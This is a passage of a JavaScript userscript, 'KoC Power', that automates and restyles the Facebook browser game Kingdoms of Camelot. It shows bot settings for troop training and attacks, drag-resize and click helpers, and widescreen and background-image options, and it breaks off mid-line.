    disKnightsTab : false, disAutoScout : true,	disWildTab : false, 	disCombatTab : false, 	disSpamTab : false, 	disFakeTab : false, 	disResTab : false,	disTourTab : false,	disInvTab : false,	enableWebTab : true,	enableWebTab2 : true,	enablekocDunno : true,	enablePartner : true,	enableWSWiKien  : true,	enableWSWiKide  : true,	enableWSUsr  : true,	enableWSImo  : true,	enableWSCalc : true, enableWSUpdater : true,
	pdxAETabLabel : 'KoC Scripts',	pdxAlliancePage : 'http://kocscripts.god-like.org',	WSTabLab : 'Ally Chat', 	WebsitePageURL : 'http://webchat.quakenet.org/?channels=#KoC.Scripts,#EuReR-ChaT-NaMe,#PDX&uio=d4',};
// GLOBALE OPTIONS
var GlobalOptions = { pbWatchdog : false,	pbWideScreen : true, pbWideScreenStyle : 'wide', autoPublishGamePopups : false,	autoPublishPrivacySetting : 80,	pbupdate : true,	pbupdatebeta : 0,};
// AUTO WALL TRAIN OPTIONS
var WallTrainOptions = { intervalSecs:	60,	doTraps: {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false},	doCalrops: {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false}, doSpikes: {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false}, doXbows: {1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false}, troopType: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},	keepFood: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0}, keepWood: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0}, keepStone: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},	keepOre: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},};
// AUTO TRAIN OPTIONS
var AutoTrainOptions = { Running : false,  list:{},  listactif:{},  listlabour:{},  timelauch:60,  unitemin:{},  unitemax:{},  listboost:{},  UnitMixValue:100,  Workers : {1:100,2:100,3:100,4:100,5:100,6:100,7:100,8:100},  Keep: {1:{Food:0,Wood:0,Stone:0,Ore:0},                  2:{Food:0,Wood:0,Stone:0,Ore:0},  				3:{Food:0,Wood:0,Stone:0,Ore:0},  				4:{Food:0,Wood:0,Stone:0,Ore:0},  				5:{Food:0,Wood:0,Stone:0,Ore:0},  				6:{Food:0,Wood:0,Stone:0,Ore:0}, 7:{Food:0,Wood:0,Stone:0,Ore:0}, 8:{Food:0,Wood:0,Stone:0,Ore:0} },  Resource   : {1:true,2:true,3:true,4:true,5:true,6:true,7:true, 8:true},  CraftingRunning : false,  CraftIntervallMin : 3,  CraftingActif : {3000:false,3001:false,3002:false,3003:false,3004:false,3005:false,3006:false,3007:false,3008:false,3009:false,3010:false,3011:false},  
CraftingNb : {3000:0,3001:0,3002:0,3003:0,3004:0,3005:0,3006:0,3007:0,3008:0,3009:0,3010:0,3011:0},};
// WAPPEN EINSTELLUNG
var CrestOptions = { Running : false,  CrestCity : 0,  RoundOne  : true,  RoundTwo  : true,  lastRoundTwo : 0,  X:0,  Y:0,  R1MM:0,  R1Ball:0,  R1Cat:0,  R2MM:0,  R2Pike:0,  R2Sword:0,  R2Arch:0,  R2Ball:0,  R2Ram:0,  R2Cat:0,};
// DARK FOREST
var AttackOptions = { LastReport : 0,  MsgEnabled : true, MsgInterval : 30,  Method : "distance",  SendInterval : 8,  MaxDistance : 40,  RallyClip : 0,  Running : false, BarbsFailedKnight : 0, BarbsFailedRP : 0, BarbsFailedTraffic : 0, BarbsFailedVaria : 0, BarbsFailedBog : 0,  BarbsTried : 0,  DeleteMsg : true, DeleteMsgs0 : false,  Foodstatus : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},  MsgLevel : {1:true,2:true,3:true,4:true,5:true,6:true,7:true,8:true,9:true,10:true},  BarbsDone : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},  BarbNumber : {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0},  Levels : {1:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},2:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},3:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},4:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},5:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},6:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},7:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false},8:{0:false,1:false,2:false,3:false,4:false,5:false,6:false,7:false,8:false,9:false,10:false}},  Troops : {1:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},2:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},3:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},4:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},5:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},6:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},7:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},8:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},9:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0},10:{1:0,2:0,3:0,4:0,5:0,6:0,7:0, 8:0,9:0, 10:0, 11:0, 12:0}},  MinDistance: {1:0,2:0,3:0,4:0,5:0,6:0,7:0,8:0,9:0,10:0},  Distance              : {1:750,2:750,3:750,4:750,5:750,6:750,7:750,8:750,9:750,10:750},  Update                : {1:[0,0],2:[0,0],3:[0,0],4:[0,0],5:[0,0],6:[0,0],7:[0,0],8:[0,0]}, UpdateEnabled : true, UpdateInterval : 30,  stopsearch            : 1,  knightselector        : 0,};
var CombatOptions = { research : [{tch8:0,tch9:0,tch13:0,tch15:0}, {tch8:0,tch9:0,tch13:0,tch15:0}],	knt      : [50,50],	guardian : [['wood',0],['ore',0]],	ratio    : [{unt1:{},unt2:{},unt3:{},unt4:{},unt5:{},unt6:{},unt7:{},unt8:{},unt9:{},unt10:{},unt11:{},unt12:{}}, {unt1:{},unt2:{},unt3:{},unt4:{},unt5:{},unt6:{},unt7:{},unt8:{},unt9:{},unt10:{},unt11:{},unt12:{}}], }
// CHAT EINSTELLUNG
var ChatOptions = {	latestChats : [], AllowUsersRemoteControl : [],	BlacklistUsersRemoteControl: [], password : '',	Chatpassenable : false, };
// PDX COUNTDOWN OPTIONS
var PDXCountOpt = {	enableC1 : false,	C1EndYear : 2011,	C1EndMonth : 12,	C1EndDay : 31,	C1EndHour : 20,	C1EndMin : 13,	C1EndSec : 37, };
// TEST TABS
var ENABLE_TEST_TAB = true;
var DEBUG_TRACE = false;
var DEBUG_SEARCH = false;
var DEBUG_TRACE_AJAX = false;
var DISABLE_BULKADD_LIST = false;
var DISABLE_POST_KNIGHT_SKILLS = false;
var ENABLE_GM_AJAX_TRACE = false;
var ENABLE_INFO_TAB = true;
var SEND_ALERT_AS_WHISPER = false;
var TEST_WIDE = false;

var History=[];
var ResetAll=false;
var ResetColors=false;
var ResetStyleOptions=false
var deleting=false;
var Cities = {};
var crestname = {};
var Seed = unsafeWindow.seed;
var Tabs = {};
var researchLevels = [];
var currentName = 'Stats';
var mainPop;
var pdxStartupTimer = null;
var CPopUpTopClass = 'pbPopTop';
var KOCversion = null;
var TrainCity = 0;
var uW = unsafeWindow;
// MAP
var provMapCoords = {imgWidth:710, imgHeight:708, mapWidth:670, mapHeight:670, leftMargin:31, topMargin:19};  
var MAP_DELAY = 1000;
// NAMES
var knightRoles = [	[culang.foreman, 'politics', culang.shrpolitics],	[culang.marschall, 'combat', culang.combat],	[culang.alchemystic, 'intelligence', culang.shrint],	[culang.steward, 'resourcefulness', culang.shrres],];
var fortNamesShort = {  53: ""+culang.crossbows+"",  55: ""+culang.trebuchet+"",  60: ""+culang.shrtrap+"",  61: ""+culang.caltr+"",  62: ""+culang.spiked+"",}
// SOURCE SERVER
if (Options.pdxSourceSever=="googlecode") {
var pdxMiniSWFplayer = "http://koc-power-pdx.googlecode.com/svn/trunk/swf/pdxminiplayer.swf";
var pdxTowerSWFplayer = "http://koc-power-pdx.googlecode.com/svn/trunk/swf/alarmplayer.swf";
}
if (Options.pdxSourceSever=="kocscripts") {
var pdxMiniSWFplayer = "http://koc.god-like.org/power/swf/pdxminiplayer.swf";
var pdxTowerSWFplayer = "http://koc.god-like.org/power/swf/swf/alarmplayer.swf";
}
if (Options.pdxSourceSever=="kocscripts2") {
var pdxMiniSWFplayer = "http://power.god-like.info/swf/pdxminiplayer.swf";
var pdxTowerSWFplayer = "http://power.god-like.info/swf/alarmplayer.swf";
}
if (Options.pdxSoundSourceSever=="kocscripts") {
var mainSoundSource = 'http://koc.god-like.org/power/sounds/default/'; 
}
if (Options.pdxSoundSourceSever=="kocscripts2") {
var mainSoundSource = 'http://sfx.god-like.info/'; 
}


/******************************************************************************
*		KOC POWER - CODE  													  *
*		do not touch the code below if you dont know what you are doing  	  *
*		 	The following code is released under public domain	 			  *
******************************************************************************/
// READ OPTIONS
readOptions();
readColors();
readGlobalOptions ();
readChatOptions();
readStyleOptions();

if(typeof addEvent!='function'){var addEvent=function(o,t,f,l){var d='addEventListener',n='on'+t,rO=o,rT=t,rF=f,rL=l;if(o[d]&&!l)return o[d](t,f,false);if(!o._evts)o._evts={};if(!o._evts[t]){o._evts[t]=o[n]?{b:o[n]}:{};o[n]=new Function('e','var r=true,o=this,a=o._evts["'+t+'"],i;for(i in a){o._f=a[i];r=o._f(e||window.event)!=false&&r;o._f=null}return r');if(t!='unload')addEvent(window,'unload',function(){removeEvent(rO,rT,rF,rL)})}if(!f._i)f._i=addEvent._i++;o._evts[t][f._i]=f};addEvent._i=1;var removeEvent=function(o,t,f,l){var d='removeEventListener';if(o[d]&&!l)return o[d](t,f,false);if(o._evts&&o._evts[t]&&f._i)delete o._evts[t][f._i]}}function cancelEvent(e,c){e.returnValue=false;if(e.preventDefault)e.preventDefault();if(c){e.cancelBubble=true;if(e.stopPropagation)e.stopPropagation()}};function DragResize(myName,config){var props={myName:myName,enabled:true,handles:['tl','tm','tr','ml','mr','bl','bm','br'],isElement:null,isHandle:null,element:null,handle:null,minWidth:10,minHeight:10,minLeft:0,maxLeft:9999,minTop:0,maxTop:9999,zIndex:1,mouseX:0,mouseY:0,lastMouseX:0,lastMouseY:0,mOffX:0,mOffY:0,elmX:0,elmY:0,elmW:0,elmH:0,allowBlur:true,ondragfocus:null,ondragstart:null,ondragmove:null,ondragend:null,ondragblur:null};for(var p in props)this[p]=(typeof config[p]=='undefined')?props[p]:config[p]};DragResize.prototype.apply=function(node){var obj=this;addEvent(node,'mousedown',function(e){obj.mouseDown(e)});addEvent(node,'mousemove',function(e){obj.mouseMove(e)});addEvent(node,'mouseup',function(e){obj.mouseUp(e)})};DragResize.prototype.select=function(newElement){with(this){if(!document.getElementById||!enabled)return;if(newElement&&(newElement!=element)&&enabled){element=newElement;element.style.zIndex=++zIndex;if(this.resizeHandleSet)this.resizeHandleSet(element,true);elmX=parseInt(element.style.left);elmY=parseInt(element.style.top);elmW=element.offsetWidth;elmH=element.offsetHeight;if(ondragfocus)this.ondragfocus()}}};DragResize.prototype.deselect=function(delHandles){with(this){if(!document.getElementById||!enabled)return;if(delHandles){if(ondragblur)this.ondragblur();if(this.resizeHandleSet)this.resizeHandleSet(element,false);element=null}handle=null;mOffX=0;mOffY=0}};DragResize.prototype.mouseDown=function(e){with(this){if(!document.getElementById||!enabled)return true;var elm=e.target||e.srcElement,newElement=null,newHandle=null,hRE=new RegExp(myName+'-([trmbl]{2})','');while(elm){if(elm.className){if(!newHandle&&(hRE.test(elm.className)||isHandle(elm)))newHandle=elm;if(isElement(elm)){newElement=elm;break}}elm=elm.parentNode}if(element&&(element!=newElement)&&allowBlur)deselect(true);if(newElement&&(!element||(newElement==element))){if(newHandle)cancelEvent(e);select(newElement,newHandle);handle=newHandle;if(handle&&ondragstart)this.ondragstart(hRE.test(handle.className))}}};DragResize.prototype.mouseMove=function(e){with(this){if(!document.getElementById||!enabled)return true;mouseX=e.pageX||e.clientX+document.documentElement.scrollLeft;mouseY=e.pageY||e.clientY+document.documentElement.scrollTop;var diffX=mouseX-lastMouseX+mOffX;var diffY=mouseY-lastMouseY+mOffY;mOffX=mOffY=0;lastMouseX=mouseX;lastMouseY=mouseY;if(!handle)return true;var isResize=false;if(this.resizeHandleDrag&&this.resizeHandleDrag(diffX,diffY)){isResize=true}else{var dX=diffX,dY=diffY;if(elmX+dX<minLeft)mOffX=(dX-(diffX=minLeft-elmX));else if(elmX+elmW+dX>maxLeft)mOffX=(dX-(diffX=maxLeft-elmX-elmW));if(elmY+dY<minTop)mOffY=(dY-(diffY=minTop-elmY));else if(elmY+elmH+dY>maxTop)mOffY=(dY-(diffY=maxTop-elmY-elmH));elmX+=diffX;elmY+=diffY}with(element.style){left=elmX+'px';width=elmW+'px';top=elmY+'px';height=elmH+'px'}if(window.opera&&document.documentElement){var oDF=document.getElementById('op-drag-fix');if(!oDF){var oDF=document.createElement('input');oDF.id='op-drag-fix';oDF.style.display='none';document.body.appendChild(oDF)}oDF.focus()}if(ondragmove)this.ondragmove(isResize);cancelEvent(e)}};DragResize.prototype.mouseUp=function(e){with(this){if(!document.getElementById||!enabled)return;var hRE=new RegExp(myName+'-([trmbl]{2})','');if(handle&&ondragend)this.ondragend(hRE.test(handle.className));deselect(false)}};DragResize.prototype.resizeHandleSet=function(elm,show){with(this){if(!elm._handle_tr){for(var h=0;h<handles.length;h++){var hDiv=document.createElement('div');hDiv.className=myName+' '+myName+'-'+handles[h];elm['_handle_'+handles[h]]=elm.appendChild(hDiv)}}for(var h=0;h<handles.length;h++){elm['_handle_'+handles[h]].style.visibility=show?'inherit':'hidden'}}};DragResize.prototype.resizeHandleDrag=function(diffX,diffY){with(this){var hClass=handle&&handle.className&&handle.className.match(new RegExp(myName+'-([tmblr]{2})'))?RegExp.$1:'';var dY=diffY,dX=diffX,processed=false;if(hClass.indexOf('t')>=0){rs=1;if(elmH-dY<minHeight)mOffY=(dY-(diffY=elmH-minHeight));else if(elmY+dY<minTop)mOffY=(dY-(diffY=minTop-elmY));elmY+=diffY;elmH-=diffY;processed=true}if(hClass.indexOf('b')>=0){rs=1;if(elmH+dY<minHeight)mOffY=(dY-(diffY=minHeight-elmH));else if(elmY+elmH+dY>maxTop)mOffY=(dY-(diffY=maxTop-elmY-elmH));elmH+=diffY;processed=true}if(hClass.indexOf('l')>=0){rs=1;if(elmW-dX<minWidth)mOffX=(dX-(diffX=elmW-minWidth));else if(elmX+dX<minLeft)mOffX=(dX-(diffX=minLeft-elmX));elmX+=diffX;elmW-=diffX;processed=true}if(hClass.indexOf('r')>=0){rs=1;if(elmW+dX<minWidth)mOffX=(dX-(diffX=minWidth-elmW));else if(elmX+elmW+dX>maxLeft)mOffX=(dX-(diffX=maxLeft-elmX-elmW));elmW+=diffX;processed=true}return processed}};
var nHtml={
	FindByXPath:function(obj,xpath,nodetype) {  if(!nodetype){  nodetype = XPathResult.FIRST_ORDERED_NODE_TYPE;     }     try {  var q=document.evaluate(xpath,obj,null,nodetype,null); } catch(e) {  GM_log('bad xpath:'+xpath); }    if(nodetype == XPathResult.FIRST_ORDERED_NODE_TYPE){  if(q && q.singleNodeValue) { return q.singleNodeValue; }   }else{ if(q){ return q; }  }  return null;    },
	ClickWin:function(win,obj,evtName) { var evt = win.document.createEvent("MouseEvents");  evt.initMouseEvent(evtName, true, true, win, 0, 0, 0, 0, 0, false, false, false, false, 0, null); return !obj.dispatchEvent(evt); },
	Click:function(obj) {  return this.ClickWin(window,obj,'click');     },
	ClickTimeout:function(obj,millisec) {  window.setTimeout(function() {      return nHtml.ClickWin(window,obj,'click');    },millisec+Math.floor(Math.random()*500));    },
	SetSelect:function(obj,v) {    for(var o=0; o<obj.options.length; o++) {      if(v==obj.options[o].value) { obj.options[o].selected=true; return true; }    }    return false;     },
	}

if (document.URL.search(/kingdomsofcamelot.com\/fb\/e2\/src\/helpFriend_src.php/i) >= 0){ helpFriends (); return true;}
if (document.URL.search(/apps.facebook.com\/kingdomsofcamelot/i) >= 0){  facebookInstance ();  return;}
if (document.URL.search(/kabam.com\/kingdoms-of-camelot\/play/i) >= 0 || document.URL.search(/kingdomsofcamelot\.com\/fb\/.*?\/standAlone\.php/i) >= 0){  kabamStandAlone ();  return;}
if (document.URL.search(/facebook.com/i) >= 0){	if(document.URL.search(/connect\/uiserver.php/i) >= 0 ||	document.URL.search(/serverfbml/i) >= 0 ||	document.URL.search(/dialog\/stream.publish/i) >= 0 ||	document.URL.search(/dialog\/apprequests/i) >= 0 ||	document.URL.search(/dialog\/feed/i) >= 0)	HandlePublishPopup ();return;}
if (document.URL.search(/kingdomsofcamelot.com/i) >= 0){  kocWideScreen ();}

function kocWideScreen(){
  function setWideFb (){
	var kocFrame = parent.document.getElementById('kocIframes1');
	if (!kocFrame){ setTimeout (setWideFb, 1000);	  return; }
	kocFrame.style.width = '100%';
	//kocFrame.style.height = '100%';
	var style = document.createElement('style')
	style.innerHTML = 'body {margin:0; width:100%; !important;}';
	kocFrame.parentNode.appendChild(style);
  }
  if(document.URL.match(/standalone=0/i)){
	  kocWatchdog ();
	  if (GlobalOptions.pbWideScreen)
			setWideFb();
  }
}
/***  Run only in "apps.facebook.com" instance ... ***/
function facebookInstance (){
    function setWide (){
    var iFrame = document.getElementById('iframe_canvas');
     if (!iFrame){
      setTimeout (setWide, 1000);
      return;
     }
    iFrame.style.width = '100%';
    while ( (iFrame=iFrame.parentNode) != null)
      if (iFrame.tagName=='DIV')
       iFrame.style.width = '100%';
	   document.getElementById('globalContainer').style.left = '0px';
       try{
        document.getElementById('rightCol').parentNode.removeChild(document.getElementById('rightCol'));
         document.getElementById('leftColContainer').parentNode.removeChild(document.getElementById('leftColContainer'));
       } catch (e){

      }
       var e = document.getElementById('mainContainer');
    if(e){
	document.getElementById('pagelet_canvas_footer_content').style.display= 'none';
		if (GlobalOptions.pbWideScreenStyle=="normal") e.parentNode.style.minWidth = '100%';
		if (GlobalOptions.pbWideScreenStyle=="wide") e.parentNode.style.width = '1520px';
		if (GlobalOptions.pbWideScreenStyle=="ultra") e.parentNode.style.width = '1900px';
		if (GlobalOptions.pbWideScreenStyle=="mega") e.parentNode.style.width = '2400px';
		if (GlobalOptions.pbWideScreenStyle=="own") e.parentNode.style.width = ""+Colors.WideScreenWidth+"" + 'px';
			for(i=0; i<e.childNodes.length; i++){
		if(e.childNodes[i].id == 'contentCol'){
			e.childNodes[i].style.margin = '0px';
			e.childNodes[i].style.color = ''+Colors.MainFont+'';
			e.childNodes[i].style.paddingTop = '5px';
		if (Options.pdxBackgroundStyle=="pdxKoCOld")e.childNodes[i].style.backgroundColor = 'none';	
		if (Options.pdxBackgroundStyle=="pdxBackgroundColordark")e.childNodes[i].style.backgroundColor = ''+Colors.MainBodyDark+'';		  
		if (Options.pdxBackgroundStyle=="pdxBackgroundColor")e.childNodes[i].style.backgroundColor = ''+Colors.MainBody+'';
		if (Options.pdxBackgroundStyle=="pdxOwnBackground") e.childNodes[i].style.backgroundImage = "url('"+Options.ownWP+"')";
		if (Options.pdxBackgroundStyle=="pdxOwnBackgrounddark") e.childNodes[i].style.backgroundImage = "url('"+Options.ownWPdark+"')";
		if (Options.pdxBackgroundStyle=="pdxBackground1") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/facebook-blue.png')";		if (Options.pdxBackgroundStyle=="pdxBackground2") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/facebook-owns-world.jpeg')";		if (Options.pdxBackgroundStyle=="pdxBackground3") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/ubuntu.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground5") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/back7.png')";		if (Options.pdxBackgroundStyle=="pdxBackground6") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/webtreats-blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground7") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/dkgreyblogbackground.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground8") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/facebook.1.u.png')";		if (Options.pdxBackgroundStyle=="pdxBackground9") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/Facebook_Logo 30.png')";		if (Options.pdxBackgroundStyle=="pdxBackground10") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/texture-4.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground11") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/kocpowerscbg.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground12") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/techno.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground13") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal-plate.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground14") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal-plate-blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground15") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal-plate-silver.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground16") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/metal.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground17") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/holed-aluminium.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground18") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/silver-light..jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground19") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/oldpaper3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground20") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/oldpaper.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground21") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/paper-background1.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground22") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/paper-background2.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground23") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/crumpled-paper2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground24") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/crumpled-paper3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground25") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/crumpled-paper.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground26") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture1.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground27") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground28") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture3.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground29") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture4.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground30") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture5.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground31") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture6.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground32") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture7.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground33") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/line-texture8.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground34") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/wood.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground35") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/wood-dark.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground36") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/wood2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground37") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/leaf.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground38") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/cloud2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground40") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/attention.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground41") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/darkred.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground42") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/darkgray.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground43") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/tech-theme.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground44") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/heart.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground45") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/butterfly-blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground46") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/blue.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground47") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/smoke.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground48") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-color.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground49") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-dark.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground50") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-green.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground51") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-green2.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground52") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/abstrac-rosa.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground53") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/blue-drop.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground54") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/electronic-monochro.jpg')";		if (Options.pdxBackgroundStyle=="pdxBackground55") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/octo-redux.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground56") e.childNodes[i].style.backgroundImage = "url('http://koc-power-pdx.googlecode.com/svn/trunk/img/backgrounds/pink-cheetah.gif')";		if (Options.pdxBackgroundStyle=="pdxBackground57") e.childNodes[i].style.backgroundImage = 